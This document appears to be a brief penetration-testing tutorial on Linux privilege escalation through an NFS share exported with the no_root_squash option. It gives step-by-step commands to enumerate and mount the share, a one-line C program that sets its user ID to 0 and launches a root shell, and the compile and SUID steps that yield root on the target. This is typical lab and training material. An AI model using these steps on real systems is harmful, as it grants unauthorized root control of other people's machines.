NFS is a distributed file system protocol that allows users to access files over a network as if they were on their local storage. It enables seamless file sharing across different systems and platforms.

NFS (Network File Sharing) configuration is kept in the ```/etc/exports``` file. This file is created during the NFS server installation and can usually be read by users.
![Screenshot from 2024-09-29 03-12-16](https://github.com/user-attachments/assets/bf41db70-90b7-4e9e-a012-a1ec58ab9785)

The critical element for this privilege escalation vector is the `no_root_squash` option you can see above. By default, NFS will change the root user to nfsnobody and strip any file from operating with root privileges. If the `no_root_squash` option is present on a writable share, we can create an executable with SUID bit set and run it on the target system.

![lol](https://github.com/user-attachments/assets/042797ac-ae65-4413-9b72-4c4f75b01027)


STEPS
--
1. We will start by enumerating mountable shares from our attacking machine.
```
showmount -e <target ip>
```

2. We will mount one of the `no_root_squash` shares to our attacking machine and start building our executable.
```
$ mkdir ourOne
$ mount -o rw,vers=2 <target ipt>:/<share folder with no_root_squash option> ~/ourOne
$ cd ourOne
```
3. create an `script.c` in our machine:
```
int main(){ setgid(0);​setuid(0);​system("/bin/bash");​return 0;​}
```
4. We should make it excutable:
```
gcc script.c -o script -w
```
5. Set an SUID to it:
```
sudo chmod +s script
```
You will see below that both files (script.c and script are present on the target system. We have worked on the mounted share so there was no need to transfer them). 

6. In the target machine, we should go to the shared directory and run `script` file:
```
./script
```
Finally, we got the root access.





